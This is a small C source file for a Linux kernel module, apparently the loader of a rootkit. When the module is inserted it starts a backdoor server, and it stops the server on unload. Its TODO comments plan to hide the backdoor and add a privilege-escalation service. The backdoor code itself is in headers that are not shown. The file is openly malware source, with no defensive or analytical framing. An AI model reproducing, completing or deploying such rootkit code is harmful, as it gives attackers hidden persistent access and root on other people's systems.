#include "rootkit.h"
#include "backdoor.h"

static int __init rkit_init(void)
{
  // Start backdoor server
  debug("Loaded rootkit\n");
  if(backdoor_start() != 0) {
    debug("Unable to start backdoor\n");
  }
  // TODO: Hide backdoor server
  // TODO: Enable privesc service
  return 0;
}

static void __exit rkit_exit(void)
{
  // Stop backdoor server
  if (backdoor_stop() != 0) {
    debug("Unable to stop backdoor\n");
  }
  debug("Shutdown successful\n");
}

module_init(rkit_init);
module_exit(rkit_exit);
